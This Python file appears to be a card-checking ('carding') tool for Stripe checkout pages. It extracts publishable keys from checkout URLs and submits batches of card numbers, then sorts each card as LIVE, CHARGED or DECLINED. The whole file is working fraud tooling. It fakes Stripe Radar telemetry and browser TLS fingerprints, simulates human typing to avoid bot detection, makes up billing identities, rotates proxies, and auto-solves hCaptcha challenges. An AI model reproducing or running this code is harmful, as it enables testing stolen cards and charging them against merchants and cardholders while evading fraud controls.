import re
import time
import random
import asyncio
import aiohttp
import base64
from urllib.parse import unquote, quote_plus

from curl_cffi.requests import AsyncSession as CurlSession

from utils.constants import (
    USER_AGENTS, TLS_PROFILES, BILLING_ADDRESSES, LIVE_DECLINE_CODES,
    get_random_billing, get_currency_symbol, get_random_browser_profile,
)
from utils.stripe import (
    get_stripe_headers, generate_stripe_fingerprints,
    generate_eid, get_stripe_cookies, get_random_stripe_js_agent,
    get_stripe_telemetry_header, record_stripe_request,
    get_stripe_js_version, generate_realistic_email,
    send_r_stripe_events,
)
from utils.proxy import get_proxy_url
from utils.captcha import solve_hcaptcha


def extract_checkout_url(text: str) -> str:
    """Extract a Stripe checkout URL from text."""
    patterns = [
        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'\<\>\)]+',
        r'https?://checkout\.stripe\.com/[^\s\"\'\<\>\)]+',
        r'https?://buy\.stripe\.com/[^\s\"\'\<\>\)]+',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            url = m.group(0).rstrip('.,;:')
            return url
    return None


async def fetch_pk_from_page(url: str) -> str:
    """Fetch checkout page HTML and extract PK via regex (fallback method)."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers={
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5"
            }, timeout=aiohttp.ClientTimeout(total=15),
            allow_redirects=True, ssl=False) as resp:
                if resp.status == 200:
                    html = await resp.text()
                    pk_patterns = [
                        r'pk_(live|test)_[A-Za-z0-9]{20,}',
                        r'"apiKey"\s*:\s*"(pk_(?:live|test)_[A-Za-z0-9]+)"',
                        r'"publishableKey"\s*:\s*"(pk_(?:live|test)_[A-Za-z0-9]+)"',
                        r'Stripe\(["\']?(pk_(?:live|test)_[A-Za-z0-9]+)["\']?\)',
                    ]
                    for pattern in pk_patterns:
                        pk_match = re.search(pattern, html)
                        if pk_match:
                            pk = pk_match.group(1) if pk_match.lastindex else pk_match.group(0)
                            if pk.startswith('pk_'):
                                print(f"[DEBUG] PK extracted from page HTML: {pk[:20]}...")
                                return pk
    except Exception as e:
        print(f"[DEBUG] fetch_pk_from_page error: {str(e)[:50]}")
    return None


async def decode_pk_from_url(url: str) -> dict:
    """Extract PK, CS, and site from a Stripe checkout URL."""
    result = {"pk": None, "cs": None, "site": None}

    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)

        # Payment Page URLs use ppage_ instead of cs_
        if not result["cs"]:
            pp_match = re.search(r'ppage_[A-Za-z0-9]+', url)
            if pp_match:
                result["cs"] = pp_match.group(0)

        # Method 1: Decode from hash fragment (XOR decode)
        if '#' in url:
            hash_part = url.split('#')[1]
            hash_decoded = unquote(hash_part)

            try:
                padded = hash_decoded + '=' * (-len(hash_decoded) % 4)
                decoded_bytes = base64.b64decode(padded)
                xored = ''.join(chr(b ^ 5) for b in decoded_bytes)

                pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
                if pk_match:
                    result["pk"] = pk_match.group(0)
                    print(f"[DEBUG] PK decoded from hash: {result['pk'][:20]}...")

                site_match = re.search(r'https?://[^\s\"\'\'<>]+', xored)
                if site_match:
                    result["site"] = site_match.group(0)
            except (ValueError, Exception) as e:
                print(f"[DEBUG] Hash decode error: {str(e)[:40]}")

        # Method 2: Fallback — fetch page HTML and extract PK
        if not result["pk"] and result["cs"]:
            print(f"[DEBUG] Hash decode failed/missing, trying page fetch fallback...")
            pk_from_page = await fetch_pk_from_page(url)
            if pk_from_page:
                result["pk"] = pk_from_page

    except Exception as e:
        print(f"[DEBUG] decode_pk_from_url error: {str(e)[:50]}")

    return result


async def get_checkout_info(url: str, tls_profile: str = None, user_agent: str = None, proxy: str = None, cookies_str: str = None) -> dict:
    """Get full checkout info from a Stripe checkout URL.
    
    Args:
        tls_profile: TLS profile to use (for consistency with confirm)
        user_agent: User-Agent to use (for consistency with confirm)
        proxy: Proxy URL to use (for consistency with confirm)
        cookies_str: Real Stripe cookies from warm session
    """
    start = time.perf_counter()
    result = {
        "url": url,
        "pk": None,
        "cs": None,
        "merchant": None,
        "price": None,
        "currency": None,
        "product": None,
        "country": None,
        "mode": None,
        "customer_name": None,
        "customer_email": None,
        "support_email": None,
        "support_phone": None,
        "cards_accepted": None,
        "success_url": None,
        "cancel_url": None,
        "init_data": None,
        "pi_id": None,
        "pi_client_secret": None,
        "error": None,
        "time": 0
    }

    try:
        decoded = await decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")

        if result["pk"] and result["cs"]:
            # Use provided TLS profile or fallback to random
            bp = get_random_browser_profile()
            init_tls = tls_profile or bp['tls']
            eid = generate_eid()
            result["eid"] = eid  # Save for reuse in confirm
            body = f"key={result['pk']}&eid={eid}&browser_locale=en-US&redirect_type=url"

            headers = get_stripe_headers(user_agent=user_agent)
            if cookies_str:
                headers["cookie"] = cookies_str
            # X-Stripe-Telemetry — real Stripe.js sends this after first request
            telemetry = get_stripe_telemetry_header()
            if telemetry:
                headers["x-stripe-telemetry"] = telemetry

            # Normalize proxy: accept both raw (host:port:user:pass) and URL format
            proxy_url = get_proxy_url(proxy) if proxy and '://' not in proxy else proxy
            async with CurlSession(impersonate=init_tls) as s:
                _init_start = time.perf_counter()
                r = await s.post(
                    f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
                    headers=headers,
                    data=body,
                    proxy=proxy_url,
                    timeout=5
                )
                # Record metrics for telemetry header on next request
                _init_dur = int((time.perf_counter() - _init_start) * 1000)
                _req_id = ""
                try:
                    _req_id = r.headers.get("Request-Id", "") or r.headers.get("request-id", "")
                except Exception:
                    pass
                if _req_id:
                    record_stripe_request(_req_id, _init_dur)
                init_data = r.json()

            if "error" not in init_data:
                result["init_data"] = init_data
                result["api_version"] = init_data.get("api_version", "2025-02-24.acacia")

                acc = init_data.get("account_settings", {})
                result["merchant"] = acc.get("display_name") or acc.get("business_name")
                result["support_email"] = acc.get("support_email")
                result["support_phone"] = acc.get("support_phone")
                result["country"] = acc.get("country")

                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    result["price"] = lig.get("total", 0) / 100
                    result["currency"] = lig.get("currency", "").upper()
                    if lig.get("line_items"):
                        items = lig["line_items"]
                        currency = lig.get("currency", "").upper()
                        sym = get_currency_symbol(currency)
                        product_parts = []
                        for item in items:
                            qty = item.get("quantity", 1)
                            name = item.get("name", "Product")
                            amt = item.get("amount", 0) / 100
                            interval = item.get("recurring_interval")
                            if interval:
                                product_parts.append(f"{qty} × {name} (at {sym}{amt:.2f} / {interval})")
                            else:
                                product_parts.append(f"{qty} × {name} ({sym}{amt:.2f})")
                        result["product"] = ", ".join(product_parts)
                elif inv:
                    result["price"] = inv.get("total", 0) / 100
                    result["currency"] = inv.get("currency", "").upper()

                mode = init_data.get("mode", "")
                if mode:
                    result["mode"] = mode.upper()
                elif init_data.get("subscription"):
                    result["mode"] = "SUBSCRIPTION"
                else:
                    result["mode"] = "PAYMENT"

                cust = init_data.get("customer") or {}
                result["customer_name"] = cust.get("name")
                result["customer_email"] = init_data.get("customer_email") or cust.get("email")

                pm_types = init_data.get("payment_method_types") or []
                if pm_types:
                    cards = [t.upper() for t in pm_types if t != "card"]
                    if "card" in pm_types:
                        cards.insert(0, "CARD")
                    result["cards_accepted"] = ", ".join(cards) if cards else "CARD"

                result["success_url"] = init_data.get("success_url")
                result["cancel_url"] = init_data.get("cancel_url")

                # Extract PaymentIntent info for direct confirm flow
                pi_obj = init_data.get("payment_intent") or {}
                if pi_obj.get("id"):
                    result["pi_id"] = pi_obj["id"]
                    result["pi_client_secret"] = pi_obj.get("client_secret", "")
                    print(f"[DEBUG] PaymentIntent: {result['pi_id'][:20]}...")
            else:
                result["error"] = init_data.get("error", {}).get("message", "Init failed")
        else:
            result["error"] = "Could not decode PK/CS from URL"

    except Exception as e:
        result["error"] = str(e)
        print(f"[DEBUG] get_checkout_info error: {str(e)[:50]}")

    result["time"] = round(time.perf_counter() - start, 2)
    return result



async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, user_id: int = None, max_retries: int = 2, session_ctx: dict = None, card_index: int = 0) -> dict:
    """Charge card using Stripe.js emulation — direct confirm with fingerprints.
    
    Args:
        session_ctx: Session context from generate_session_context(). 
                     If provided, uses consistent TLS/fingerprints for the whole session.
        card_index: Index of this card in the batch (0-based), used for time_on_page.
    """
    start = time.perf_counter()
    card_display = f"{card['cc'][:6]}****{card['cc'][-4:]}"
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "email": None,
        "time": 0
    }

    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")

    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result

    print(f"\n[DEBUG] Card: {card_display}")

    # Use session context if provided, otherwise fallback to per-card generation
    if session_ctx:
        profile = session_ctx["tls_profile"]
        fp = session_ctx["fingerprints"]
        stripe_cookies = session_ctx["cookies"]
        pua = session_ctx["payment_user_agent"]
        pasted = session_ctx["pasted_fields"]
        # Time on page increases naturally per card (user spends more time)
        time_on_page = session_ctx["time_on_page_base"] + (card_index * random.randint(3000, 8000))
    else:
        from utils.stripe import generate_session_context as _gen_ctx
        _ctx = _gen_ctx(user_id)
        profile = _ctx["tls_profile"]
        fp = _ctx["fingerprints"]
        stripe_cookies = _ctx["cookies"]
        pua = _ctx["payment_user_agent"]
        pasted = _ctx["pasted_fields"]
        time_on_page = _ctx["time_on_page_base"]

    for attempt in range(max_retries + 1):
        try:
            proxy_url = get_proxy_url(proxy_str) if proxy_str else None
            async with CurlSession(impersonate=profile) as s:
                checksum = init_data.get("init_checksum", "")

                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
                elif inv:
                    total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
                else:
                    pi = init_data.get("payment_intent") or {}
                    total = subtotal = pi.get("amount", 0)

                cust = init_data.get("customer") or {}
                addr = cust.get("address") or {}

                # Detect country: customer address → merchant country → fallback MO (Macau)
                detected_country = (
                    addr.get("country")
                    or checkout_data.get("country")
                    or init_data.get("account_settings", {}).get("country")
                    or "MO"
                )

                # Use customer data if available, otherwise random billing matched to country
                # Only use checkout data if BOTH name AND complete address exist
                if cust.get("name") and addr.get("line1") and addr.get("city"):
                    name = cust.get("name")
                    country = addr.get("country") or detected_country
                    line1 = addr.get("line1")
                    city = addr.get("city")
                    state = addr.get("state") or ""
                    zip_code = addr.get("postal_code") or ""
                elif session_ctx and session_ctx.get("billing"):
                    # Use cached billing from session context (same for all cards)
                    billing = session_ctx["billing"]
                    name = billing["name"]
                    country = billing["country"]
                    line1 = billing["line1"]
                    city = billing["city"]
                    state = billing["state"]
                    zip_code = billing["zip"]
                else:
                    # Use random billing matched to detected country
                    billing = get_random_billing(detected_country)
                    name = billing["name"]
                    country = billing["country"]
                    line1 = billing["line1"]
                    city = billing["city"]
                    state = billing["state"]
                    zip_code = billing["zip"]
                
                print(f"[DEBUG] Billing: country={country}, name={name}, city={city}")

                if attempt > 0:
                    print(f"[DEBUG] Retry attempt {attempt}...")

                # Reuse eid from init for first card (browser behavior)
                # Only generate new eid for retry/subsequent cards
                if card_index == 0:
                    eid = checkout_data.get("eid") or generate_eid()
                else:
                    eid = generate_eid()

                # ━━━ Behavioral Analysis: Human-like timing simulation ━━━
                from utils.behavioral import simulate_checkout_input, TypingSpeed
                
                # Determine typing speed (rotate per card untuk variasi)
                speed_options = [TypingSpeed.SLOW, TypingSpeed.NORMAL, TypingSpeed.FAST]
                selected_speed = speed_options[card_index % len(speed_options)]
                
                # Generate timing untuk input kartu
                expiry = f"{card['month']}{card['year']}"
                timing = simulate_checkout_input(
                    card_number=card['cc'],
                    expiry=expiry,
                    cvc=card['cvv'],
                    zip_code=zip_code if zip_code else "",
                    speed=selected_speed
                )
                
                print(f"[BEHAVIOR] Simulating human input: {timing['total_time']:.1f}s total | Profile: {timing['speed_profile']}")
                
                # Execute delays per field
                breakdown = timing["breakdown"]
                field_order = ["cc", "expiry", "cvc", "zip"]
                
                for field in field_order:
                    if field not in breakdown:
                        continue
                    
                    info = breakdown[field]
                    
                    # Input time
                    print(f"[BEHAVIOR]   → {field}: {info['input_time']:.2f}s (simulated {info['wpm']} WPM)")
                    await asyncio.sleep(info["input_time"])
                    
                    # Distraction pause (jika ada)
                    if info.get("distraction", 0) > 0:
                        print(f"[BEHAVIOR]   → Pause: {info['distraction']:.2f}s")
                        await asyncio.sleep(info["distraction"])
                    
                    # Transition ke field berikutnya
                    if "transition_to_next" in info:
                        await asyncio.sleep(info["transition_to_next"])

                print(f"[DEBUG] TLS Profile: {profile} | Confirming with fingerprints...")

                # ━━━ Send r.stripe.com Radar telemetry before tokenize ━━━
                # Real Stripe.js sends lifecycle events (focus/blur) to r.stripe.com/0
                # Without this, Stripe Radar sees zero telemetry = bot score > 80
                checkout_url = checkout_data.get("url", "https://checkout.stripe.com")
                device_fp = session_ctx.get("device_fp") if session_ctx else None
                try:
                    await send_r_stripe_events(
                        fp=fp,
                        checkout_url=checkout_url,
                        tls_profile=profile,
                        user_agent=session_ctx.get("user_agent", "") if session_ctx else "",
                        cookies_str=stripe_cookies,
                        device_fp=device_fp,
                        proxy=proxy_url,
                        payment_user_agent=pua,
                    )
                except Exception as _r_err:
                    print(f"[DEBUG] ⚠️ r.stripe.com skipped: {str(_r_err)[:40]}")

                # ━━━ Step 1: Tokenize card → PaymentMethod (pm_xxx) ━━━
                # Real browser tokenizes card in Stripe Elements iframe FIRST,
                # then confirm only sends pm_xxx — NOT raw card data
                
                # Resolve email AFTER name is available
                email = init_data.get("customer_email") or generate_realistic_email(name)
                result["email"] = email
                print(f"[DEBUG] Email: {email}")

                pm_body = (
                    f"type=card"
                    f"&card[number]={card['cc']}"
                    f"&card[cvc]={card['cvv']}"
                    f"&card[exp_month]={card['month']}"
                    f"&card[exp_year]={card['year']}"
                    f"&billing_details[name]={name}"
                    f"&billing_details[email]={email}"
                    f"&billing_details[address][country]={country}"
                    f"&billing_details[address][line1]={line1}"
                    f"&billing_details[address][city]={city}"
                    f"&billing_details[address][postal_code]={zip_code}"
                    f"&billing_details[address][state]={state}"
                    f"&guid={fp['guid']}"
                    f"&muid={fp['muid']}"
                    f"&sid={fp['sid']}"
                    f"&payment_user_agent={pua}"
                    f"&time_on_page={time_on_page}"
                    f"&key={pk}"
                )
                if pasted:
                    pm_body += f"&pasted_fields={pasted}"
                # allow_redisplay — modern Stripe.js always sends this
                allow_redisplay = "unspecified"
                if session_ctx and session_ctx.get("allow_redisplay"):
                    allow_redisplay = session_ctx["allow_redisplay"]
                pm_body += f"&allow_redisplay={allow_redisplay}"
                pm_body += f"&referrer={checkout_url}"


                # Use curl_cffi headers + matched UA + sec-ch-ua + cookies
                ua = session_ctx.get("user_agent") if session_ctx else None
                headers = get_stripe_headers(user_agent=ua)
                if session_ctx and session_ctx.get("cookies"):
                    headers["cookie"] = session_ctx["cookies"]
                # X-Stripe-Telemetry — must be present on tokenize (2nd+ request)
                telemetry = get_stripe_telemetry_header()
                if telemetry:
                    headers["x-stripe-telemetry"] = telemetry

                _pm_start = time.perf_counter()
                pm_r = await s.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=headers,
                    data=pm_body,
                    proxy=proxy_url,
                    timeout=8
                )
                _pm_dur = int((time.perf_counter() - _pm_start) * 1000)
                try:
                    _pm_req_id = pm_r.headers.get("Request-Id", "") or pm_r.headers.get("request-id", "")
                    if _pm_req_id:
                        record_stripe_request(_pm_req_id, _pm_dur)
                except Exception:
                    pass
                
                pm_data = pm_r.json()
                pm_id = pm_data.get("id", "")
                
                if "error" in pm_data or not pm_id:
                    # Card tokenization failed (invalid card, etc.)
                    err = pm_data.get("error", {})
                    dc = err.get("decline_code", "")
                    msg = err.get("message", "Card tokenization failed")
                    err_code = err.get("code", "")
                    print(f"[DEBUG] PM tokenize failed: {dc or err_code} - {msg}")
                    if dc in LIVE_DECLINE_CODES:
                        result["status"] = "LIVE"
                    else:
                        result["status"] = "DECLINED"
                    result["response"] = f"[{dc or err_code or 'tokenize_failed'}] [{msg}]"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
                
                print(f"[DEBUG] ✅ Card tokenized: {pm_id[:20]}...")

                # ━━━ Step 2: Confirm with PM ID (matches real browser) ━━━
                # Real browser sends pm_xxx, NOT raw card data in confirm
                # eid = "NA" in real browser (not UUID)
                # guid/muid/sid at top level (not inside payment_method_data)
                
                # Generate client_session_id for attribution metadata
                client_session_id = str(__import__('uuid').uuid4())
                checkout_config_id = str(__import__('uuid').uuid4())
                
                conf_body = (
                    f"eid=NA"
                    f"&payment_method={pm_id}"
                    f"&expected_amount={total}"
                    f"&expected_payment_method_type=card"
                    f"&guid={fp['guid']}"
                    f"&muid={fp['muid']}"
                    f"&sid={fp['sid']}"
                    f"&key={pk}"
                    f"&version={get_stripe_js_version()}"
                    f"&init_checksum={checksum}"
                    f"&client_attribution_metadata[client_session_id]={client_session_id}"
                    f"&client_attribution_metadata[checkout_session_id]={cs}"
                    f"&client_attribution_metadata[merchant_integration_source]=checkout"
                    f"&client_attribution_metadata[merchant_integration_version]=hosted_checkout"
                    f"&client_attribution_metadata[payment_method_selection_flow]=automatic"
                    f"&client_attribution_metadata[checkout_config_id]={checkout_config_id}"
                )

                # Update telemetry for confirm (uses PM creation metrics)
                telemetry2 = get_stripe_telemetry_header()
                if telemetry2:
                    headers["x-stripe-telemetry"] = telemetry2

                _conf_start = time.perf_counter()
                r = await s.post(
                    f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                    headers=headers,
                    data=conf_body,
                    proxy=proxy_url,
                    timeout=10
                )
                # Record for next telemetry
                _conf_dur = int((time.perf_counter() - _conf_start) * 1000)
                try:
                    _conf_req_id = r.headers.get("Request-Id", "") or r.headers.get("request-id", "")
                    if _conf_req_id:
                        record_stripe_request(_conf_req_id, _conf_dur)
                except Exception:
                    pass
                conf = r.json()

                print(f"[DEBUG] Confirm Response: {str(conf)[:200]}...")

                if "error" in conf:
                    err = conf["error"]
                    dc = err.get("decline_code", "")
                    msg = err.get("message", "Failed")
                    err_code = err.get("code", "")

                    # Check if session is expired/inactive/canceled/already paid
                    if err_code in ('checkout_not_active_session', 'payment_intent_unexpected_state', 'checkout_succeeded_session') or 'no longer active' in msg.lower() or 'status of canceled' in msg.lower() or 'already been processed' in msg.lower():
                        result["status"] = "SESSION_EXPIRED"
                    # Check if decline code indicates card is LIVE
                    elif dc in LIVE_DECLINE_CODES:
                        result["status"] = "LIVE"
                    else:
                        result["status"] = "DECLINED"
                    if dc:
                        result["response"] = f"[{dc}] [{msg}]"
                    elif err_code:
                        result["response"] = f"[{err_code}] [{msg}]"
                    else:
                        result["response"] = msg
                    print(f"[DEBUG] Decline: {dc or err_code} - {msg}")
                else:
                    pi = conf.get("payment_intent") or {}
                    st = pi.get("status", "") or conf.get("status", "")
                    if st == "succeeded":
                        result["status"] = "CHARGED"
                        result["response"] = "Payment Successful"
                    elif st == "requires_action":
                        # ━━━ Detailed next_action analysis ━━━
                        next_action = pi.get("next_action") or {}
                        na_type = next_action.get("type", "unknown")
                        
                        print(f"[DEBUG] requires_action detected!")
                        print(f"[DEBUG] next_action.type: {na_type}")
                        print(f"[DEBUG] next_action full: {str(next_action)[:500]}")
                        
                        if na_type == "use_stripe_sdk":
                            sdk_data = next_action.get("use_stripe_sdk", {})
                            sdk_type = sdk_data.get("type", "unknown")
                            stripe_js = sdk_data.get("stripe_js") or {}
                            print(f"[DEBUG] 3DS SDK type: {sdk_type}")
                            
                            if sdk_type == "intent_confirmation_challenge":
                                site_key = ""
                                if isinstance(stripe_js, dict):
                                    site_key = stripe_js.get("site_key", "")
                                print(f"[DEBUG] hCaptcha challenge — site_key={site_key[:20] if site_key else 'N/A'}")
                                
                                # ━━━ Auto-solve hCaptcha via NopeCHA ━━━
                                pi_id = pi.get("id", "")
                                pi_secret = pi.get("client_secret", "")
                                checkout_url = checkout_data.get("url", "https://checkout.stripe.com")
                                captcha_proxy = proxy_url if proxy_url else None
                                captcha_ua = headers.get("user-agent", "")
                                
                                # Log captcha solver parameters for debugging
                                print(f"[DEBUG] ━━━ CAPTCHA SOLVE PARAMS ━━━")
                                print(f"[DEBUG]   PI: {pi_id}")
                                print(f"[DEBUG]   site_key: {site_key}")
                                print(f"[DEBUG]   captcha_proxy: {captcha_proxy or 'NONE (solving without proxy)'}")
                                print(f"[DEBUG]   captcha_ua: {captcha_ua[:60]}...")
                                print(f"[DEBUG]   checkout_url: {checkout_url[:80]}...")
                                
                                # Extract rqdata for hCaptcha Enterprise (Stripe always sends this)
                                rqdata = ""
                                if isinstance(stripe_js, dict):
                                    rqdata = stripe_js.get("rqdata", "")
                                if rqdata:
                                    print(f"[DEBUG]   rqdata: {rqdata[:40]}... ({len(rqdata)} chars)")
                                else:
                                    print(f"[DEBUG]   rqdata: NONE")
                                print(f"[DEBUG] ━━━━━━━━━━━━━━━━━━━━━━")
                                
                                captcha_result = await solve_hcaptcha(
                                    site_key=site_key,
                                    url=checkout_url,
                                    rqdata=rqdata or None,
                                    proxy=captcha_proxy,
                                    user_agent=captcha_ua,
                                )
                                
                                # Extract token and ekey from result dict
                                captcha_token = None
                                captcha_ekey = None
                                if isinstance(captcha_result, dict):
                                    captcha_token = captcha_result.get("token")
                                    captcha_ekey = captcha_result.get("ekey")
                                elif isinstance(captcha_result, str):
                                    # Backwards compat if solve returns string
                                    captcha_token = captcha_result
                                
                                if captcha_token and pi_id and pi_secret:
                                    print(f"[DEBUG] Captcha solved! Re-confirming PI...")
                                    print(f"[DEBUG] ━━━ VERIFY CHALLENGE DEBUG ━━━")
                                    print(f"[DEBUG]   PI ID: {pi_id}")
                                    print(f"[DEBUG]   PI Secret: {pi_secret[:30]}...")
                                    print(f"[DEBUG]   Token length: {len(captcha_token)}")
                                    print(f"[DEBUG]   Token first 20: {captcha_token[:20]}")
                                    print(f"[DEBUG]   Token last 20: ...{captcha_token[-20:]}")
                                    if captcha_ekey:
                                        print(f"[DEBUG]   ekey: {captcha_ekey[:30]}...")
                                    else:
                                        print(f"[DEBUG]   ekey: NONE (not provided by solver)")
                                    
                                    # Use verification_url from Stripe response (for Checkout Sessions)
                                    verify_path = ""
                                    if isinstance(stripe_js, dict):
                                        verify_path = stripe_js.get("verification_url", "")
                                    
                                    if verify_path:
                                        verify_url = f"https://api.stripe.com{verify_path}"
                                    else:
                                        verify_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/verify_challenge"
                                    
                                    print(f"[DEBUG]   Verify URL: {verify_url}")
                                    print(f"[DEBUG]   Proxy: {proxy_url or 'DIRECT'}")
                                    
                                    # Build verify body — matches real Stripe.js format
                                    # Required: challenge_response_token, client_secret, captcha_vendor_name, key
                                    # Optional: challenge_response_ekey (if available)
                                    reconfirm_body = (
                                        f"challenge_response_token={captcha_token}"
                                        f"&client_secret={pi_secret}"
                                        f"&captcha_vendor_name=hcaptcha"
                                        f"&key={pk}"
                                    )
                                    if captcha_ekey:
                                        reconfirm_body += f"&challenge_response_ekey={captcha_ekey}"
                                    
                                    # Log all headers being sent
                                    print(f"[DEBUG]   Request headers: {list(headers.keys())}")
                                    print(f"[DEBUG]   Has cookie: {'cookie' in headers}")
                                    print(f"[DEBUG]   Has telemetry: {'x-stripe-telemetry' in headers}")
                                    print(f"[DEBUG]   Body size: {len(reconfirm_body)} chars")
                                    
                                    try:
                                        _verify_start = time.perf_counter()
                                        r2 = await s.post(
                                            verify_url,
                                            headers=headers,
                                            data=reconfirm_body,
                                            proxy=proxy_url,
                                            timeout=25
                                        )
                                        _verify_dur = round((time.perf_counter() - _verify_start) * 1000)
                                        reconf = r2.json()
                                        
                                        # Detailed response logging
                                        print(f"[DEBUG] ━━━ VERIFY RESPONSE ━━━")
                                        print(f"[DEBUG]   HTTP Status: {r2.status_code}")
                                        print(f"[DEBUG]   Duration: {_verify_dur}ms")
                                        try:
                                            resp_req_id = r2.headers.get("Request-Id", "") or r2.headers.get("request-id", "")
                                            if resp_req_id:
                                                print(f"[DEBUG]   Request-Id: {resp_req_id}")
                                            idempotency = r2.headers.get("Idempotency-Key", "") or r2.headers.get("idempotency-key", "")
                                            if idempotency:
                                                print(f"[DEBUG]   Idempotency-Key: {idempotency}")
                                            stripe_version = r2.headers.get("Stripe-Version", "") or r2.headers.get("stripe-version", "")
                                            if stripe_version:
                                                print(f"[DEBUG]   Stripe-Version: {stripe_version}")
                                        except Exception:
                                            pass
                                        
                                        # Full response dump (key fields)
                                        if isinstance(reconf, dict):
                                            print(f"[DEBUG]   Response keys: {list(reconf.keys())}")
                                            print(f"[DEBUG]   status: {reconf.get('status', 'N/A')}")
                                            if reconf.get("error"):
                                                err_full = reconf["error"]
                                                print(f"[DEBUG]   error.type: {err_full.get('type', 'N/A')}")
                                                print(f"[DEBUG]   error.code: {err_full.get('code', 'N/A')}")
                                                print(f"[DEBUG]   error.decline_code: {err_full.get('decline_code', 'N/A')}")
                                                print(f"[DEBUG]   error.message: {err_full.get('message', 'N/A')}")
                                                print(f"[DEBUG]   error.param: {err_full.get('param', 'N/A')}")
                                                print(f"[DEBUG]   error.doc_url: {err_full.get('doc_url', 'N/A')}")
                                                # Check for charge info
                                                charge = err_full.get("charge")
                                                if charge:
                                                    print(f"[DEBUG]   error.charge: {charge}")
                                            if reconf.get("last_payment_error"):
                                                lpe_full = reconf["last_payment_error"]
                                                print(f"[DEBUG]   last_payment_error.type: {lpe_full.get('type', 'N/A')}")
                                                print(f"[DEBUG]   last_payment_error.code: {lpe_full.get('code', 'N/A')}")
                                                print(f"[DEBUG]   last_payment_error.decline_code: {lpe_full.get('decline_code', 'N/A')}")
                                                print(f"[DEBUG]   last_payment_error.message: {lpe_full.get('message', 'N/A')}")
                                        print(f"[DEBUG]   Full response (500c): {str(reconf)[:500]}")
                                        print(f"[DEBUG] ━━━━━━━━━━━━━━━━━━━━━━")
                                        
                                        reconf_status = reconf.get("status", "")
                                        if reconf_status == "succeeded":
                                            result["status"] = "CHARGED"
                                            result["response"] = "Solved Captcha"
                                            print(f"[DEBUG] CHARGED after captcha solve!")
                                        elif "error" in reconf:
                                            re_err = reconf["error"]
                                            re_dc = re_err.get("decline_code", "")
                                            re_code = re_err.get("code", "")
                                            re_msg = re_err.get("message", "Failed after captcha")
                                            # Distinguish captcha token rejection from card decline
                                            if re_code == "payment_intent_authentication_failure" or "captcha" in re_msg.lower():
                                                # Captcha token was rejected by Stripe — NOT a card issue
                                                result["status"] = "3DS"
                                                result["response"] = f"Captcha Token Rejected — {re_msg}"
                                                print(f"[DEBUG] ⚠️ Captcha token rejected by Stripe (IP/session mismatch?)")
                                            elif re_dc in LIVE_DECLINE_CODES:
                                                result["status"] = "LIVE"
                                                result["response"] = f"Solved Captcha -> [{re_dc}] [{re_msg}]"
                                            else:
                                                result["status"] = "DECLINED"
                                                result["response"] = f"Solved Captcha -> [{re_dc or re_code}] [{re_msg}]"
                                            print(f"[DEBUG] Post-captcha: {re_dc or re_code} - {re_msg}")
                                        elif reconf_status == "requires_payment_method":
                                            # Card declined after captcha — extract decline details
                                            lpe = reconf.get("last_payment_error") or {}
                                            lpe_dc = lpe.get("decline_code", "")
                                            lpe_msg = lpe.get("message", "Card declined after captcha")
                                            lpe_code = lpe.get("code", "")
                                            print(f"[DEBUG] Card declined after captcha: dc={lpe_dc}, code={lpe_code}, msg={lpe_msg}")
                                            if lpe_dc in LIVE_DECLINE_CODES:
                                                result["status"] = "LIVE"
                                            else:
                                                result["status"] = "DECLINED"
                                            result["response"] = f"Captcha Solved -> [{lpe_dc or lpe_code or 'declined'}] [{lpe_msg}]"
                                        else:
                                            result["status"] = "SOLVED CAPTCHA"
                                            result["response"] = f"Captcha Solved -> {reconf_status}"
                                            print(f"[DEBUG] Captcha solved, PI status: {reconf_status}")
                                    except Exception as e2:
                                        print(f"[DEBUG] Re-confirm error: {str(e2)[:60]}")
                                        result["status"] = "SOLVED CAPTCHA"
                                        result["response"] = f"Captcha Solved — confirm failed"
                                else:
                                    if not captcha_token:
                                        print(f"[DEBUG] Captcha solve failed")
                                    result["status"] = "3DS"
                                    result["response"] = f"CAPTCHA [{sdk_type}] — solve failed"
                            else:
                                result["status"] = "3DS"
                                result["response"] = f"3DS Challenge [{sdk_type}]"
                        elif na_type == "redirect_to_url":
                            redirect_url = next_action.get("redirect_to_url", {}).get("url", "")
                            print(f"[DEBUG] 3DS redirect URL: {redirect_url[:200]}")
                            result["status"] = "3DS"
                            result["response"] = f"3DS Redirect [{na_type}]"
                        else:
                            print(f"[DEBUG] Unknown next_action type: {na_type}")
                            result["status"] = "3DS"
                            result["response"] = f"3DS [{na_type}]"
                    elif st == "requires_payment_method":
                        result["status"] = "DECLINED"
                        result["response"] = "Card Declined"
                    else:
                        result["status"] = "UNKNOWN"
                        result["response"] = st or "Unknown"

                result["time"] = round(time.perf_counter() - start, 2)
                print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
                return result

        except Exception as e:
            err_str = str(e)
            print(f"[DEBUG] Error: {err_str[:50]}")
            if attempt < max_retries and ("disconnect" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower()):
                print(f"[DEBUG] Retrying in 1s...")
                await asyncio.sleep(1)
                continue
